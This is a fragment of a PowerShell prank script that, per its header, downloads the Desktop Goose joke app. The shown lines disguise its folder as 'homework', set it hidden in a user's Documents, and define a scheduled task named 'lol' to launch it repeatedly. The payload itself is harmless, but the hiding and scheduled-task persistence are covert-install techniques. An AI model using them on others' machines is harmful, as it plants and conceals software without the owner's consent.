...
#-------------------------------
#Description:
# - This script downloads desktop goose, hides it in a Documents folder, and creates a scheduled task that starts it at 9am and repeats 
...
Rename-Item -Path "C:\Users\DSU\Documents\goose" -NewName "homework"
Set-ItemProperty -Path "C:\Users\DSU\Documents\homework" -Name "Attributes" -Value ([System.IO.FileAttributes]::Hidden)

#Creates Scheduled task
# Define variables
$taskName = "lol"
$actionExe = "C:\Users\DSU\Documents\homework\Desktop Goose v0.31\Desktop Goose v0.31\DesktopGoose v0.31\GooseDesktop.exe"
